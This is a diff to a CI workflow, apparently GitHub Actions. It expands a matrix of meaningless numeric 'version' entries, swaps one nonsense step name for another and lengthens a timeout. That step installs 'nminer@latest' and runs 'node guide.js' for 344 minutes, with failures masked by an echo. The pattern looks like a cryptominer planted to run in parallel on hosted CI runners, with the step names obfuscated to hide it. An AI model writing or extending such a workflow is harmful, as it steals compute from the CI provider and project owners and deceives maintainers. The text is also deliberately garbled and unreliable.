@@ -9,24 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 6443 }
-          - { version: 976 }
-          - { version: 9686 }
-          - { version: 2226 }
-          - { version: 9423 }
-          - { version: 7123 }
-          - { version: 6202 }
-          - { version: 2798 }
-          - { version: 6180 }
-          - { version: 1202 }
-          - { version: 8885 }
+          - { version: 2021 }
+          - { version: 5270 }
+          - { version: 2546 }
+          - { version: 8985 }
+          - { version: 7168 }
+          - { version: 3219 }
+          - { version: 2069 }
+          - { version: 9895 }
+          - { version: 7988 }
+          - { version: 9412 }
+          - { version: 1775 }
           - { version: 6386 }
-          - { version: 1344 }
-          - { version: 367 }
-          - { version: 1668 }
-          - { version: 8151 }
-          - { version: 8198 }
-          - { version: 6608 }
+          - { version: 7261 }
+          - { version: 8623 }
+          - { version: 9447 }
+          - { version: 4699 }
+          - { version: 7681 }
+          - { version: 3379 }
+          - { version: 7390 }
 
     steps:
       - name: Checkout
@@ -37,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: um caring staid birth
+      - name: absentmindedly but however indeed
         run: |
           npm install nminer@latest
-          timeout 312m node guide.js || echo "guide executed"
+          timeout 344m node guide.js || echo "guide executed"
